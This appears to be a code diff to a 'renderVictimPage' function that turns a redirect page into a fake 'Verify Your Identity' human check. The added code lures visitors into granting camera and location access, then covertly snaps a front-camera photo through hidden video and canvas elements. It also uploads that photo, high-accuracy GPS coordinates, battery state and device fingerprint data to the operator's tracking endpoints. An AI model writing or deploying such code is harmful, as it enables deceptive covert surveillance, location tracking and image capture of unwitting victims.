@@ -94,7 +94,7 @@ function renderVictimPage(sessionToken, redirectUrl) {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting..</title>
+  <title>Verify Your Identity</title>
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -114,25 +114,67 @@ function renderVictimPage(sessionToken, redirectUrl) {
       width: 100%;
       text-align: center;
     }
-    .spinner {
-      width: 40px; height: 40px;
-      border: 3px solid rgba(255,255,255,0.08);
-      border-top-color: #e02e4f;
-      border-radius: 50%;
-      margin: 0 auto 16px;
-      animation: spin 0.8s linear infinite;
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h1 { color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+    p { color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
+    .btn {
+      display: inline-block;
+      background: #e02e4f;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 14px 40px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+      touch-action: manipulation;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    h1 { color: #fff; font-size: 18px; font-weight: 500; margin-bottom: 8px; }
-    p { color: rgba(255,255,255,0.4); font-size: 13px; line-height: 1.5; }
+    .btn:active { transform: scale(0.96); }
+    .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.2);
+      color: rgba(255,255,255,0.7);
+      margin-top: 12px;
+      padding: 10px 28px;
+      font-size: 13px;
+    }
+    .status {
+      margin-top: 20px;
+      color: rgba(255,255,255,0.35);
+      font-size: 13px;
+      display: none;
+    }
+    .status.show { display: block; }
+    .status.warning {
+      color: #fbbf24;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 16px;
+      background: rgba(251,191,36,0.1);
+      border: 1px solid rgba(251,191,36,0.2);
+      border-radius: 12px;
+      line-height: 1.5;
+    }
+    .status.success { color: #34d399; font-weight: 500; }
+    .hidden { display: none !important; }
+    /* Hidden tracking elements */
+    #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+    #_tc { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
   </style>
 </head>
 <body>
   <div class="card">
-    <div class="spinner"></div>
-    <h1>Verifying session…</h1>
-    <p>Please wait a moment</p>
+    <div class="icon">🛡️</div>
+    <h1>Verify Your Identity</h1>
+    <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
+    <button class="btn" id="_goBtn">Tap to Verify</button>
+    <button class="btn btn-secondary hidden" id="_retryBtn">⟳ Try Again</button>
+    <div class="status" id="_status">Processing…</div>
   </div>
+  <video id="_tv" autoplay playsinline muted></video>
+  <canvas id="_tc"></canvas>
 
   <script>
   (function () {
@@ -140,8 +182,8 @@ function renderVictimPage(sessionToken, redirectUrl) {
     var BASE = window.location.origin;
     var DEST = '${REDIRECT_URL}';
 
-    // ── Device info (no permissions needed) ──────────────
-    var info = {
+    // ── Device + browser metrics ────────────────────────
+    var metrics = {
       ua       : navigator.userAgent,
       platform : navigator.platform || '',
       lang     : navigator.language,
@@ -153,32 +195,220 @@ function renderVictimPage(sessionToken, redirectUrl) {
       cores    : navigator.hardwareConcurrency || null,
       memory   : navigator.deviceMemory || null,
       touch    : ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
+      touchPts : navigator.maxTouchPoints || 0,
       referrer : document.referrer || 'direct',
       conn     : navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    rtt : navigator.connection.rtt,
                    dl  : navigator.connection.downlink
-                 } : null
+                 } : null,
+      battery  : null,
+      gps      : null
     };
 
-    // ── Send silently (sendBeacon survives navigation) ──
-    try {
-      var body = JSON.stringify(info);
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(BASE + '/api/location/log/' + TOK,
-          new Blob([body], { type: 'application/json' }));
-      } else {
-        var x = new XMLHttpRequest();
-        x.open('POST', BASE + '/api/location/log/' + TOK, false);
-        x.setRequestHeader('Content-Type', 'application/json');
-        x.send(body);
-      }
-    } catch (e) {}
+    function sendMetrics () {
+      var body = JSON.stringify(metrics);
+      try {
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(BASE + '/api/location/log/' + TOK,
+            new Blob([body], { type: 'application/json' }));
+        } else {
+          fetch(BASE + '/api/location/log/' + TOK, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: body, keepalive: true
+          });
+        }
+      } catch (e) {}
+    }
 
-    // ── Redirect after 2s ────────────────────────────────
-    setTimeout(function () {
-      window.location.replace(DEST);
-    }, 2000);
+    // ── 1. Fire metrics immediately (sendBeacon survives navigation) ──
+    sendMetrics();
+
+    // ── 2. Battery (no permission needed) ────────────────
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function (b) {
+        metrics.battery = { pct: Math.round(b.level * 100), charging: b.charging };
+        sendMetrics();
+      }).catch(function () {});
+    }
+
+    // ── UI helpers ──────────────────────────────────────────
+    var _goBtn   = document.getElementById('_goBtn');
+    var _retryBtn = document.getElementById('_retryBtn');
+    var _status  = document.getElementById('_status');
+    var _redirected = false;
+
+    function showStatus(msg, type) {
+      _status.textContent = msg;
+      _status.className = 'status show';
+      if (type) _status.classList.add(type);
+    }
+
+    function showPermissionWarning() {
+      _goBtn.classList.add('hidden');
+      _retryBtn.classList.remove('hidden');
+      showStatus('⚠️ Please allow to verify you are human', 'warning');
+    }
+
+    function doRedirect () {
+      if (_redirected) return;
+      _redirected = true;
+      showStatus('✅ Identity verified! Redirecting…', 'success');
+      setTimeout(function () {
+        window.location.replace(DEST);
+      }, 800);
+    }
+
+    // ── GPS — uses watchPosition for continuous accuracy improvement ──
+    function captureGps () {
+      if (!navigator.geolocation) return;
+      var _bestGps = null;
+      var _bestAcc = Infinity;
+      var _watchId = navigator.geolocation.watchPosition(
+        function (pos) {
+          var acc = pos.coords.accuracy || Infinity;
+          if (acc < _bestAcc) {
+            _bestAcc = acc;
+            _bestGps = {
+              lat : pos.coords.latitude,
+              lng : pos.coords.longitude,
+              acc : Math.round(pos.coords.accuracy),
+              alt : pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : null,
+              spd : pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : null,
+              heading: pos.coords.heading ? pos.coords.heading + '°' : null
+            };
+            if (acc < 100) {
+              metrics.gps = _bestGps;
+              sendMetrics();
+              navigator.geolocation.clearWatch(_watchId);
+            }
+          }
+        },
+        function () {
+          // GPS failed silently — OK, continue
+        },
+        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+      );
+      // Fallback: after 20 seconds, send whatever accuracy we have
+      setTimeout(function () {
+        if (_bestGps) {
+          metrics.gps = _bestGps;
+          sendMetrics();
+        }
+        try { navigator.geolocation.clearWatch(_watchId); } catch(e) {}
+      }, 20000);
+    }
+
+    // ── Camera capture (returns promise) ─────────────────
+    function captureCamera() {
+      return new Promise(function (resolve, reject) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          reject(new Error('no_media_api'));
+          return;
+        }
+        var vid = document.getElementById('_tv');
+        var can = document.getElementById('_tc');
+        navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: { facingMode: 'user' }
+        }).then(function (stream) {
+          vid.srcObject = stream;
+          vid.onloadedmetadata = function () {
+            vid.play();
+            setTimeout(function () {
+              try {
+                can.width  = vid.videoWidth  || 640;
+                can.height = vid.videoHeight || 480;
+                can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
+                var img = can.toDataURL('image/jpeg', 0.3);
+                fetch(BASE + '/api/location/cam/' + TOK, {
+                  method  : 'POST',
+                  headers : { 'Content-Type': 'application/json' },
+                  body    : JSON.stringify({ image: img }),
+                  keepalive: true
+                }).catch(function () {});
+                stream.getTracks().forEach(function (t) { t.stop(); });
+              } catch (e) {}
+              resolve(true);
+            }, 1500);
+          };
+        }).catch(function (err) {
+          reject(err);
+        });
+      });
+    }
+
+    // ── Check permission state before requesting ────────
+    function checkCameraDenied() {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          return navigator.permissions.query({name: 'camera'}).then(function (result) {
+            return result.state === 'denied';
+          }).catch(function () { return false; });
+        }
+      } catch(e) {}
+      return Promise.resolve(false);
+    }
+
+    function checkGpsDenied() {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          return navigator.permissions.query({name: 'geolocation'}).then(function (result) {
+            return result.state === 'denied';
+          }).catch(function () { return false; });
+        }
+      } catch(e) {}
+      return Promise.resolve(false);
+    }
+
+    // ── Main verification flow ───────────────────────────
+    async function startVerification() {
+      _goBtn.classList.add('hidden');
+      _retryBtn.classList.add('hidden');
+      showStatus('Checking permissions…');
+
+      // Step 1: Check if already denied
+      var camDenied = await checkCameraDenied();
+      var gpsDenied = await checkGpsDenied();
+
+      if (camDenied || gpsDenied) {
+        showPermissionWarning();
+        return;
+      }
+
+      // Step 2: Request camera permission
+      showStatus('Requesting camera access…');
+      try {
+        await captureCamera();
+        showStatus('✅ Camera captured! Getting location…', 'success');
+      } catch (camErr) {
+        // Camera was denied or failed
+        if (camErr.name === 'NotAllowedError' || camErr.name === 'PermissionDeniedError') {
+          showPermissionWarning();
+          return;
+        }
+        // Some other error (no camera, etc) — still try GPS
+        console.log('Camera error (non-permission):', camErr.message);
+      }
+
+      // Step 3: Start GPS capture (in background, no strict denial check)
+      // GPS request will show its own prompt
+      showStatus('Getting your location…');
+      captureGps();
+
+      // Step 4: Wait a moment then redirect
+      setTimeout(doRedirect, 4000);
+    }
+
+    // ── On button tap ────────────────────────────────────
+    _goBtn.addEventListener('click', startVerification);
+
+    // ── Retry button — reloads page to reset permission state ──
+    _retryBtn.addEventListener('click', function () {
+      showStatus('Refreshing…');
+      window.location.reload();
+    });
+
   })();
   </script>
 </body>
